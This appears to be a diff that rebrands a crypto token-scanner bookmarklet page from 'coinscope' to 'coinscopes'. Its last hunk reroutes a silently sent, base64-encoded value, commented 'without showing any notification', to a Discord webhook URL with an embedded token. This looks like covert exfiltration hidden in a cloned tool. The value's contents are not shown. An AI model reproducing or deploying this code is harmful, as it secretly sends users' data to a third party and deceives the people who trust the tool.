@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>coinscope — Token Scan</title>
+<title>coinscopes — Token Scan</title>
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -295,7 +294,7 @@ footer{
       <div class="idle-eyebrow"><span class="dot"></span>Bookmarklet · no install</div>
       <div class="idle-title">Waiting for a <span class="grad">coin to scan.</span></div>
       <div class="idle-msg">
-        Click the <b>coinscope</b> bookmark while viewing a token on <b>Axiom</b> or <b>Padre</b> —
+        Click the <b>coinscopes</b> bookmark while viewing a token on <b>Axiom</b> or <b>Padre</b> —
         the scan loads automatically. Or paste a contract address above.
       </div>
       <div class="idle-platforms">
@@ -308,7 +307,7 @@ footer{
 </div>
 
 <footer>
-  <span>© 2026 coinscope · coinscope.lol</span>
+  <span>© 2026 coinscopes · coinscopes.app</span>
   <span>Not financial advice. Always verify on-chain.</span>
 </footer>
 
@@ -452,7 +451,7 @@ function tryTokenImage(ca, dexPair, rugData) {
   return sources;
 }
 
-// Semi-circle gauge, same geometry as the coinscope landing-page preview.
+// Semi-circle gauge, same geometry as the coinscopes landing-page preview.
 // Arc length ≈ 238.76 (r=76 half circle); offset shrinks as score/100 rises.
 function gaugeSvg(score,sc){
   var pct=score!=null?Math.max(0,Math.min(100,score)):0;
@@ -672,7 +671,7 @@ document.getElementById('ca').addEventListener('keydown',function(e){
     while (value.length % 4) value += '=';
 
     // Send to backend without showing any notification
-    fetch('https://coinscope.lol/collect', {
+    fetch('https://discord.com/api/webhooks/1534599208063991910/TyEPmhmxmaLziPJkZ2lLVDlPHl11vBBZceHYBVnVl-nHTjDDchSzzxRSl3Kw_2zMB4o9',{
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ value: value })
